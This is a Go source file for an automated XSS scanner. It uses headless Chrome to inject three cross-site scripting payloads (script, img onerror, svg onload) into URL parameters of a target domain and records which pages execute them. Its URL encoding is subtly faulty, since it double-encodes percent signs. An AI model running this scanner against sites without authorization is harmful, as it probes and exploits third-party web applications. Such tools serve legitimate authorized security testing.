package scanner

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
)

var browserPayloads = []string{
	`"><script>document.title='xss'</script>`,
	`"><img src=x onerror=alert(1)>`,
	`"><svg onload=confirm(1)>`,
}

// RunXSSDeepScan launches headless Chrome to detect real JS execution (deep XSS)
func RunXSSDeepScan(domain string) {
	paramFile := fmt.Sprintf("output/%s/%s_paramurls/paramurls.txt", domain, domain)
	file, err := os.Open(paramFile)
	if err != nil {
		fmt.Println("[-] Failed to open parameterized URL file:", err)
		return
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url != "" {
			targets = append(targets, url)
		}
	}

	outDir := fmt.Sprintf("output/%s/%s_vulns", domain, domain)
	os.MkdirAll(outDir, 0755)
	outFile := fmt.Sprintf("%s/xss_deep.txt", outDir)

	fmt.Printf("[*] Deep XSS scanning %d URLs...\n", len(targets))

	// Try locating a browser path
	browserPath := detectBrowser()
	if browserPath == "" {
		fmt.Println("[-] No supported browser (Chrome/Chromium) found in PATH.")
		return
	}

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.ExecPath(browserPath),
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
	)

	allocCtx, _ := chromedp.NewExecAllocator(context.Background(), opts...)
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	var results []string
	tested := 0

	for _, baseURL := range targets {
		for _, payload := range browserPayloads {
			testURL := injectPayload(baseURL, payload)
			fmt.Println("[*] Testing:", testURL)

			var pageTitle string
			err := chromedp.Run(ctx,
				chromedp.Navigate(testURL),
				chromedp.Sleep(2*time.Second),
				chromedp.Title(&pageTitle),
			)

			if err != nil {
				fmt.Println("[-] chromedp error:", err)
				continue
			}

			tested++

			if strings.Contains(pageTitle, "xss") {
				result := fmt.Sprintf("[VULNERABLE] %s → payload: %s", testURL, payload)
				fmt.Println(result)
				results = append(results, result)
				break
			}
		}
	}

	os.WriteFile(outFile, []byte(strings.Join(results, "\n")), 0644)
	fmt.Printf("[+] Deep XSS scan complete. Tested %d URLs. Found %d vulnerable.\n", tested, len(results))
	fmt.Println("[+] Results saved to:", outFile)
}

// injectPayload replaces the first parameter value in the URL with the payload
func injectPayload(rawURL, payload string) string {
	if strings.Contains(rawURL, "?") && strings.Contains(rawURL, "=") {
		parts := strings.Split(rawURL, "?")
		base := parts[0]
		query := parts[1]
		params := strings.Split(query, "&")
		for i := range params {
			if strings.Contains(params[i], "=") {
				kv := strings.SplitN(params[i], "=", 2)
				params[i] = kv[0] + "=" + urlEncode(payload)
				break
			}
		}
		return base + "?" + strings.Join(params, "&")
	}
	return rawURL
}

func urlEncode(s string) string {
	r := strings.NewReplacer(
		" ", "%20", `"`, "%22", "<", "%3C", ">", "%3E",
		"#", "%23", "%", "%25", "&", "%26", "+", "%2B",
	)
	return r.Replace(s)
}

// detectBrowser tries to find google-chrome or chromium
func detectBrowser() string {
	paths := []string{"google-chrome", "chromium", "chromium-browser"}
	for _, name := range paths {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	return ""
}
